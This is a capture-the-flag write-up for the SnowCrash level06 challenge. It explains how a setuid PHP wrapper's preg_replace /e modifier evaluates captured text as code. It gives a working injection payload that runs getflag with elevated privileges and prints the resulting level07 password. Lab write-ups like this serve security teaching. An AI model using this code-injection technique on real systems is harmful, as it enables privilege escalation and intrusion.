# Objective

As `level06`, the goal is to exploit a vulnerability to gain `flag06`'s privileges and read the flag, which is the password for `level07`.

The flag is gained through the command `getflag`, run as `flag06`.

```sh
level06@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

```sh
level06@SnowCrash:~$ pwd
/home/user/level06

level06@SnowCrash:~$ ll
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
```

# Resolution

### File type

Let us inquire about `level06` and `level06.php`.

```sh
level06@SnowCrash:~$ file level06
level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped
```

>`level06` is an executable.


```sh
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

> `level06.php` is a php script.

Here's a formatted version:

```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;

?>
```

Supposedly, `level06` is going to interpret `level06.php`. The `/e` modifier on `preg_replace` is a well-known PHP vulnerability: it tells PHP to evaluate the replacement string as PHP code rather than treat it as plain text, so whatever is captured by the regex ends up executed. It was deprecated and later removed in PHP 7 precisely because of this.

Here, the pattern `/(\[x (.*)\])/e` captures anything between `[x ` and `]` and feeds it to `y()`, which itself runs through the same evaluation. We just need to smuggle a PHP expression through `y`'s capture group.

First, we need to create a file that is going to be passed as the first argument and opened by `file_get_contents`.

```sh
level06@SnowCrash:~$ touch file
touch: cannot touch `file': Permission denied

level06@SnowCrash:~$ chmod u+rwx .
level06@SnowCrash:~$ touch file
level06@SnowCrash:~$ chmod 755 ./file 
```

Then, we'll populate it with the command we need, which is `getflag`.

```sh
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > file 

level06@SnowCrash:~$ ./level06 /home/user/level06/file b
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Bingo.

```sh
level06@SnowCrash:~$ su - level07
Password: # wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$ 
```
